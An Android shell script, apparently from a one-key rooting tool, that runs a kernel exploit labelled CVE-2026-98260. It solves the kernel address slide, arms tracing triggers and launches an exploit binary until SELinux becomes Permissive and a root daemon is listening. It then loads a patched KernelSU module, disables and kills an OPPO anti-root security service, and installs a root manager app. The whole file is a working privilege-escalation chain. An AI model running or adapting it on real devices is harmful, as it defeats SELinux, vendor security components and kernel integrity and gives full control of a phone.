#!/system/bin/sh
# PYB110 one-key flow, CVE-2026-98260 branch:
# slide -> brm_plant (official PYB110 port) -> rootd -> ksud late-load -> manager
D=${PYB110_DIR:-/data/local/tmp/pyb110}
cd "$D" || exit 1
chmod 755 brm_plant pc98260_su prep_solve prep_patch forker ksu* ksud* 2>/dev/null

MANAGER=${PYB110_MANAGER:-kernelsu}
DISABLE_ANTIROOT=${PYB110_DISABLE_ANTIROOT:-1}
case "$MANAGER" in
  next) BASE=ksu-base-next.ko; KSUD=ksud_next; MPKG=com.rifsxd.ksunext ;;
  bakasu) BASE=ksu-base-bakasu.ko; KSUD=ksud_bakasu; MPKG=com.resukisu.resukisu ;;
  sukisu) BASE=ksu-base-sukisu.ko; KSUD=ksud_sukisu; MPKG=com.sukisu.ultra ;;
  *) MANAGER=kernelsu; BASE=ksu-base.ko; KSUD=ksud_official; MPKG=me.weishu.kernelsu ;;
esac
MPKG=${PYB110_MANAGER_PKG:-$MPKG}
LATE_LOAD=${PYB110_LATE_LOAD:-1}
echo "EXPLOIT=98260 MANAGER=$MANAGER VERSION=${PYB110_MANAGER_VERSION:-unknown} late_load=$LATE_LOAD"

install_manager_apk() {
  APK=${PYB110_MANAGER_APK:-}
  if [ -n "$APK" ] && [ -f "$D/$APK" ]; then
    su -c "pm install -r '$D/$APK'" 2>&1
    echo "APK_INSTALL_RC=$?"
  fi
}

finish_manager() {
  cp -f "$KSUD" /data/local/tmp/ksud_official 2>/dev/null
  if [ "$DISABLE_ANTIROOT" = "1" ]; then
    su -c "pm disable-user --user 0 com.oplus.exsystemservice" 2>&1
    echo "DISABLE_RC=$?"
    su -c "pkill -9 -f com.oplus.exsystemservice" 2>&1
    echo "KILL_RC=$?"
    sleep 5
    su -c "pm enable com.oplus.exsystemservice" 2>&1
    echo "ANTIROOT_RESTORED: 已恢复 exsystemservice；如截图等系统功能异常，请软重启（重启 zygote/SystemUI）"
  else
    echo "ANTIROOT_SKIP: 开关关闭，未禁用安全组件"
  fi
  su -c "/data/local/tmp/ksud_official install" 2>&1
  echo "KSUD_INSTALL_RC=$?"
  install_manager_apk
  su -c "id; getenforce; grep -i kernelsu /proc/modules" 2>&1
  echo "SU_ID_RC=$?"
  am force-stop "$MPKG" 2>/dev/null
  monkey -p "$MPKG" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
}

if grep -qi kernelsu /proc/modules 2>/dev/null; then
  echo "ALREADY_LOADED: kernelsu present, skip exploit/load"
  finish_manager
  echo DONE
  exit 0
fi

echo "[1/4] capture slide"
sh take_slide.sh
echo "[2/4] solve slide"
./prep_solve . syms.txt || { echo "SOLVE_FAIL"; exit 11; }
SLIDE=$(cat slide.txt)
echo "SLIDE=$SLIDE"

echo "[3/4] run brm_plant (CVE-2026-98260)"
# 清理上次残留与 trace 触发状态；干净开机时这些写操作是无害的
kill -9 $(pidof brm_plant) 2>/dev/null
rm -f plant.log t98260_root_ok
R=/sys/kernel/tracing/events/kmem/rss_stat
echo 1 > "$R/enable" 2>/dev/null
printf '!disable_event:kmem:kmem_cache_alloc\n' > "$R/trigger" 2>/dev/null
printf '!disable_event:kmem:mm_page_alloc\n' > "$R/trigger" 2>/dev/null
printf '!disable_event:kmem:mm_page_free\n' > "$R/trigger" 2>/dev/null
setsid ./brm_plant --slide "$SLIDE" > plant.log 2>&1 &
BP=$!
echo "PLANT_PID=$BP (命中后 SELinux 会变 Permissive，整段约 20-120 秒，请勿手动结束)"
ROOTED=0
i=0
while [ $i -lt 140 ]; do
  if grep -q "listening at" plant.log 2>/dev/null; then ROOTED=1; break; fi
  if grep -qE "holding zombie|NO_PERMISSIVE|capture failed|SOLVE_FAIL" plant.log 2>/dev/null; then break; fi
  kill -0 $BP 2>/dev/null || break
  if [ $((i % 5)) -eq 0 ]; then
    tail -n 2 plant.log 2>/dev/null | sed 's/^/  | /'
  fi
  sleep 3
  i=$((i+1))
done
if [ "$ROOTED" != "1" ] || [ "$(getenforce 2>/dev/null)" != "Permissive" ]; then
  echo "PLANT_FAIL (enforce=$(getenforce 2>/dev/null))"
  tail -n 12 plant.log 2>/dev/null
  exit 12
fi
echo "PLANT_OK: enforce=Permissive, rootd ready"

echo "[4/4] handoff to $MANAGER (late_load=$LATE_LOAD)"
if [ "$LATE_LOAD" = "1" ]; then
  ./pc98260_su -c "$D/$KSUD late-load --kmi android17-6.18 --allow-shell --package-name $MPKG" 2>&1
  sleep 2
fi
if ! grep -qi kernelsu /proc/modules 2>/dev/null && [ "$LATE_LOAD" = "1" ]; then
  echo "LATE_LOAD_RETRY: without --kmi"
  ./pc98260_su -c "$D/$KSUD late-load --allow-shell --package-name $MPKG" 2>&1
  sleep 2
fi
if ! grep -qi kernelsu /proc/modules 2>/dev/null; then
  echo "LATE_LOAD_FAIL: fallback to insmod ($BASE)"
  ./prep_patch "$BASE" syms.txt "$SLIDE" ksu-98260.ko || { echo "PATCH_FAIL"; exit 13; }
  ./pc98260_su -c "insmod $D/ksu-98260.ko" 2>&1
  echo "INSMOD_RC=$?"
  sleep 2
fi
if ! grep -qi kernelsu /proc/modules 2>/dev/null; then
  echo "LOAD_FAIL"
  exit 14
fi
echo "MODULE_LOADED"

finish_manager
echo DONE
